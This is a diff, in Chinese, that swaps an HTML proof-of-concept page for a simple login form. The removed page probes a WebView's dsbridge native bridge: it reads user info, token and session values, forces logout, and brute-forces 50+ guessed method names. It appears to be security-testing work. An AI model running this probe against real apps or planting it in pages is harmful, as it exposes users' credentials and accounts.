@@ -2,377 +2,40 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JSBridge 风险验证 PoC</title>
+    <title>正规登录页面</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            max-width: 1200px;
-            margin: 20px auto;
+        .login-box {
+            width: 300px;
+            margin: 100px auto;
             padding: 20px;
-            background: #f5f5f5;
+            border: 1px solid #ccc;
+            border-radius: 5px;
         }
-        h1 { color: #d32f2f; text-align: center; }
-        h2 { color: #333; border-bottom: 2px solid #ddd; padding-bottom: 8px; }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        input {
+            width: 100%;
+            margin: 10px 0;
+            padding: 8px;
+            box-sizing: border-box;
         }
-        .section { margin: 25px 0; padding: 20px; border: 1px solid #ddd; border-radius: 8px; background: #fafafa; }
-        .btn {
-            display: inline-block;
-            background: #d32f2f;
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #007bff;
             color: white;
             border: none;
-            padding: 12px 24px;
-            margin: 8px;
-            border-radius: 6px;
+            border-radius: 5px;
             cursor: pointer;
-            font-weight: bold;
-            font-size: 14px;
         }
-        .btn:hover { background: #b71c1c; }
-        .btn.green { background: #388e3c; }
-        .btn.green:hover { background: #2e7d32; }
-        .btn.blue { background: #1976d2; }
-        .btn.blue:hover { background: #1565c0; }
-        .result-box {
-            background: #1a1a1a;
-            color: #0f0;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 10px 0;
-            font-family: monospace;
-            max-height: 400px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-        .success { color: #4caf50; }
-        .error { color: #f44336; }
-        .info { color: #2196f3; }
-        .warning { color: #ff9800; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-top: 15px; }
-        .card { padding: 15px; background: white; border: 1px solid #ddd; border-radius: 8px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔴 JSBridge 风险验证 PoC</h1>
-        
-        <div class="section">
-            <h2>1️⃣ 基础检测</h2>
-            <button class="btn" onclick="checkBridge()">检测 _dsbridge</button>
-            <div id="basicResult" class="result-box"></div>
-        </div>
-        
-        <div class="section">
-            <h2>2️⃣ 高风险 - 用户组件</h2>
-            <div class="grid">
-                <div class="card">
-                    <h4>获取用户信息</h4>
-                    <button class="btn green" onclick="testUserInfo()">getUserInfo()</button>
-                </div>
-                <div class="card">
-                    <h4>强制退出</h4>
-                    <button class="btn" onclick="testLogout()">logout()</button>
-                </div>
-            </div>
-            <div id="userResult" class="result-box"></div>
-        </div>
-        
-        <div class="section">
-            <h2>3️⃣ 高风险 - KV存储</h2>
-            <div class="grid">
-                <div class="card">
-                    <h4>读取 Token</h4>
-                    <button class="btn green" onclick="testKvGet('token')">kv.get('token')</button>
-                </div>
-                <div class="card">
-                    <h4>读取 Session</h4>
-                    <button class="btn green" onclick="testKvGet('session')">kv.get('session')</button>
-                </div>
-                <div class="card">
-                    <h4>写入测试</h4>
-                    <button class="btn blue" onclick="testKvSet()">kv.set()</button>
-                </div>
-            </div>
-            <div id="kvResult" class="result-box"></div>
-        </div>
-        
-        <div class="section">
-            <h2>4️⃣ 中风险 - App信息</h2>
-            <div class="grid">
-                <div class="card">
-                    <h4>获取 App 信息</h4>
-                    <button class="btn green" onclick="testAppInfo()">app.getInfo()</button>
-                </div>
-                <div class="card">
-                    <h4>获取 Scheme</h4>
-                    <button class="btn green" onclick="testAppScheme()">app.getScheme()</button>
-                </div>
-            </div>
-            <div id="appResult" class="result-box"></div>
-        </div>
-        
-        <div class="section">
-            <h2>5️⃣ 家庭数据</h2>
-            <button class="btn green" onclick="testHomeData()">home_data.getHomeId()</button>
-            <div id="homeResult" class="result-box"></div>
-        </div>
-        
-        <div class="section">
-            <h2>6️⃣ 暴力枚举（大量方法）</h2>
-            <button class="btn" onclick="bruteForceAll()">开始枚举 50+ 个方法</button>
-            <div id="bruteResult" class="result-box"></div>
-        </div>
-        
-        <div class="section">
-            <h2>7️⃣ 自定义调用</h2>
-            <div style="margin-bottom: 15px;">
-                <input type="text" id="customMethod" value="plugin.user.getUserInfo" style="width: 60%; padding: 10px;">
-                <input type="text" id="customParam" value="null" placeholder='参数' style="width: 30%; padding: 10px;">
-            </div>
-            <button class="btn blue" onclick="customCall()">调用</button>
-            <div id="customResult" class="result-box"></div>
-        </div>
-        
-        <div class="section">
-            <h2>📊 结果汇总</h2>
-            <button class="btn blue" onclick="exportResults()">导出结果</button>
-            <button class="btn" onclick="clearAll()">清空</button>
-            <div id="summary" class="result-box"></div>
-        </div>
+    <div class="login-box">
+        <h2>用户登录</h2>
+        <form>
+            <input type="text" placeholder="用户名" required>
+            <input type="password" placeholder="密码" required>
+            <button type="submit">登录</button>
+        </form>
     </div>
-    
-    <script>
-        const results = {
-            timestamp: new Date().toISOString(),
-            checks: [],
-            findings: []
-        };
-        
-        function log(el, msg, type) {
-            const ts = new Date().toLocaleTimeString();
-            const colorClass = type ? type : 'info';
-            el.innerHTML += `<div class="${colorClass}">[${ts}] ${msg}</div>`;
-            el.scrollTop = el.scrollHeight;
-        }
-        
-        function checkBridge() {
-            const out = document.getElementById('basicResult');
-            out.innerHTML = '';
-            
-            log(out, '正在检测 _dsbridge 对象...', 'info');
-            
-            const bridgeNames = ['_dsbridge', '_dsb', 'dsbridge', 'dsBridge', 'nativeJSBridge'];
-            let found = false;
-            
-            for (const name of bridgeNames) {
-                if (window[name]) {
-                    log(out, `✅ 发现: ${name}`, 'success');
-                    found = true;
-                    results.checks.push({ type: 'bridge', name: name, available: true });
-                    
-                    try {
-                        const props = Object.getOwnPropertyNames(window[name]);
-                        log(out, `属性: ${props.join(', ')}`, 'info');
-                    } catch (e) {
-                        log(out, `获取属性失败: ${e.message}`, 'error');
-                    }
-                }
-            }
-            
-            if (!found) {
-                log(out, '❌ 未发现 _dsbridge 对象', 'error');
-                results.checks.push({ type: 'bridge', available: false });
-            }
-            
-            updateSummary();
-        }
-        
-        function callBridge(method, params, callback, elementId) {
-            const out = document.getElementById(elementId);
-            let bridge = window._dsbridge || window._dsb;
-            
-            if (!bridge) {
-                log(out, '❌ _dsbridge 不可用', 'error');
-                return;
-            }
-            
-            log(out, `调用: ${method}(${JSON.stringify(params)})`, 'info');
-            
-            try {
-                bridge.call(method, params, function(result) {
-                    if (result !== undefined && result !== null) {
-                        log(out, `✅ 返回: ${JSON.stringify(result)}`, 'success');
-                        results.findings.push({
-                            method: method,
-                            result: result
-                        });
-                    } else {
-                        log(out, `返回: undefined/null`, 'warning');
-                    }
-                    if (callback) callback(result);
-                    updateSummary();
-                });
-            } catch (e) {
-                log(out, `❌ 调用失败: ${e.message}`, 'error');
-            }
-        }
-        
-        function testUserInfo() {
-            const out = document.getElementById('userResult');
-            out.innerHTML = '';
-            callBridge('plugin.user.getUserInfo', null, null, 'userResult');
-        }
-        
-        function testLogout() {
-            if (confirm('确定要测试 logout() 吗？这会退出当前账号！')) {
-                const out = document.getElementById('userResult');
-                out.innerHTML = '';
-                callBridge('plugin.user.logout', null, null, 'userResult');
-            }
-        }
-        
-        function testKvGet(key) {
-            const out = document.getElementById('kvResult');
-            out.innerHTML = '';
-            callBridge('plugin.kv.get', key, null, 'kvResult');
-        }
-        
-        function testKvSet() {
-            const out = document.getElementById('kvResult');
-            out.innerHTML = '';
-            const testData = { k: 'poc_test_key', v: 'poc_test_value_' + Date.now() };
-            callBridge('plugin.kv.set', testData, function(result) {
-                log(out, '写入完成，尝试读取验证...', 'info');
-                setTimeout(() => callBridge('plugin.kv.get', 'poc_test_key', null, 'kvResult'), 500);
-            }, 'kvResult');
-        }
-        
-        function testAppInfo() {
-            const out = document.getElementById('appResult');
-            out.innerHTML = '';
-            callBridge('plugin.app.getInfo', null, null, 'appResult');
-        }
-        
-        function testAppScheme() {
-            const out = document.getElementById('appResult');
-            out.innerHTML = '';
-            callBridge('plugin.app.getScheme', null, null, 'appResult');
-        }
-        
-        function testHomeData() {
-            const out = document.getElementById('homeResult');
-            out.innerHTML = '';
-            callBridge('plugin.home_data.getHomeId', null, null, 'homeResult');
-        }
-        
-        const allMethods = [
-            'plugin.user.getUserInfo', 'user.getUserInfo', 'getUserInfo',
-            'plugin.user.logout', 'user.logout', 'logout',
-            'plugin.kv.get', 'kv.get', 'get',
-            'plugin.kv.set', 'kv.set', 'set',
-            'plugin.kv.remove', 'kv.remove', 'remove',
-            'plugin.app.getInfo', 'app.getInfo', 'getAppInfo',
-            'plugin.app.getScheme', 'app.getScheme', 'getScheme',
-            'plugin.home_data.getHomeId', 'home_data.getHomeId', 'getHomeId',
-            'plugin.toast.show', 'toast.show', 'showToast',
-            'plugin.nav.setTitle', 'nav.setTitle', 'setTitle',
-            'plugin.nav.go', 'nav.go', 'go',
-            'plugin.phone.call', 'phone.call', 'makeCall',
-            'plugin.phone.copy', 'phone.copy', 'copyNumber',
-            'plugin.clipboard.get', 'clipboard.get', 'getClipboard',
-            'plugin.clipboard.set', 'clipboard.set', 'setClipboard',
-            'plugin.page.close', 'page.close', 'closePage',
-            'plugin.page.refresh', 'page.refresh', 'refresh',
-            'plugin.imagePicker.pick', 'imagePicker.pick', 'pickImage',
-            'plugin.mediaPreview.preview', 'mediaPreview.preview', 'preview',
-            'plugin.token.get', 'token.get', 'getToken',
-            'plugin.net.request', 'net.request', 'request',
-            'getCurrentUser', 'getUid', 'getNickname', 'getEmail',
-            'test', 'testMethod', 'debug', 'ping', 'echo',
-            'plugin.user.testUsergetinfo'
-        ];
-        
-        function bruteForceAll() {
-            const out = document.getElementById('bruteResult');
-            out.innerHTML = '';
-            log(out, '开始暴力枚举 ' + allMethods.length + ' 个方法...', 'warning');
-            
-            let index = 0;
-            const bridge = window._dsbridge || window._dsb;
-            
-            if (!bridge) {
-                log(out, '❌ _dsbridge 不可用', 'error');
-                return;
-            }
-            
-            function next() {
-                if (index >= allMethods.length) {
-                    log(out, '枚举完成！', 'success');
-                    updateSummary();
-                    return;
-                }
-                
-                const method = allMethods[index];
-                index++;
-                
-                try {
-                    bridge.call(method, null, function(result) {
-                        if (result !== undefined && result !== null && result !== '') {
-                            log(out, `✅ ${method} -> ${JSON.stringify(result)}`, 'success');
-                            results.findings.push({ method, result });
-                        }
-                        setTimeout(next, 100);
-                    });
-                } catch (e) {
-                    setTimeout(next, 50);
-                }
-            }
-            
-            next();
-        }
-        
-        function customCall() {
-            const method = document.getElementById('customMethod').value;
-            let param = document.getElementById('customParam').value;
-            const out = document.getElementById('customResult');
-            out.innerHTML = '';
-            
-            try {
-                param = JSON.parse(param);
-            } catch (e) {}
-            
-            callBridge(method, param, null, 'customResult');
-        }
-        
-        function updateSummary() {
-            const out = document.getElementById('summary');
-            out.innerHTML = JSON.stringify(results, null, 2);
-        }
-        
-        function exportResults() {
-            const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' });
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = 'jsbridge_findings_' + Date.now() + '.json';
-            a.click();
-        }
-        
-        function clearAll() {
-            document.querySelectorAll('.result-box').forEach(el => el.innerHTML = '');
-            results.checks = [];
-            results.findings = [];
-            updateSummary();
-        }
-        
-        window.onload = function() {
-            checkBridge();
-        };
-    </script>
 </body>
 </html>
